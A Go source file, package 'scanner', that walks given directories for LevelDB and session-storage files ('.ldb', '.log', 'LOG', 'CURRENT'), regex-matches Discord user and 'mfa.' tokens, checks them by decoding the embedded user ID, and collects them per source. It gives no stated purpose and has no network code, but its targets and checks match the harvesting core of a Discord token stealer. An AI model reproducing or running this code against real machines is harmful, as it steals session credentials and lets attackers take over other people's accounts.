package scanner

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"unicode"
)

var (
	mfaPattern  = regexp.MustCompile(`mfa\.[\w-]{80,120}`)
	tokenPattern = regexp.MustCompile(`[\w-]{23,26}\.[\w-]{4,8}\.[\w-]{20,40}`)
)

const maxRead = 8 * 1024 * 1024

func looksLikeDiscordUserToken(token string) bool {
	if strings.HasPrefix(token, "mfa.") {
		return len(token) >= 84
	}
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return false
	}
	userB64, ts, sig := parts[0], parts[1], parts[2]
	if len(userB64) < 18 || len(ts) < 4 || len(sig) < 27 {
		return false
	}
	if strings.Contains(userB64, "-") {
		return false
	}
	padded := userB64 + strings.Repeat("=", (4-len(userB64)%4)%4)
	raw, err := base64.StdEncoding.DecodeString(padded)
	if err != nil {
		raw, err = base64.RawStdEncoding.DecodeString(userB64)
		if err != nil {
			return false
		}
	}
	userID := string(raw)
	if len(userID) < 15 {
		return false
	}
	for _, c := range userID {
		if !unicode.IsDigit(c) {
			return false
		}
	}
	return true
}

func extractFromData(data []byte) map[string]struct{} {
	found := make(map[string]struct{})
	for _, m := range mfaPattern.FindAll(data, -1) {
		t := string(m)
		if looksLikeDiscordUserToken(t) {
			found[t] = struct{}{}
		}
	}
	for _, m := range tokenPattern.FindAll(data, -1) {
		t := string(m)
		if looksLikeDiscordUserToken(t) {
			found[t] = struct{}{}
		}
	}
	return found
}

func shouldScanFile(dir, name string) bool {
	if strings.Contains(strings.ToLower(dir), "session storage") {
		return true
	}
	ext := strings.ToLower(filepath.Ext(name))
	return ext == ".log" || ext == ".ldb" || ext == ".sst" || name == "LOG" || name == "CURRENT"
}

func tokensFromDir(dir string) map[string]struct{} {
	found := make(map[string]struct{})
	entries, err := os.ReadDir(dir)
	if err != nil {
		return found
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if !shouldScanFile(dir, name) {
			continue
		}
		path := filepath.Join(dir, name)
		data, err := readFileLimit(path, maxRead)
		if err != nil {
			continue
		}
		for t := range extractFromData(data) {
			found[t] = struct{}{}
		}
	}
	return found
}

func readFileLimit(path string, limit int64) ([]byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	buf := make([]byte, limit)
	n, err := f.Read(buf)
	if err != nil && n == 0 {
		return nil, err
	}
	return buf[:n], nil
}

type ScanTarget struct {
	Label string
	Path  string
}

func ScanAll(targets []ScanTarget) map[string]map[string]struct{} {
	bySource := make(map[string]map[string]struct{})
	for _, t := range targets {
		tokens := tokensFromDir(t.Path)
		if len(tokens) > 0 {
			bySource[t.Label] = tokens
		}
	}
	return bySource
}

func MergeUnique(bySource map[string]map[string]struct{}) map[string][]string {
	index := make(map[string][]string)
	for source, tokens := range bySource {
		for t := range tokens {
			index[t] = append(index[t], source)
		}
	}
	return index
}
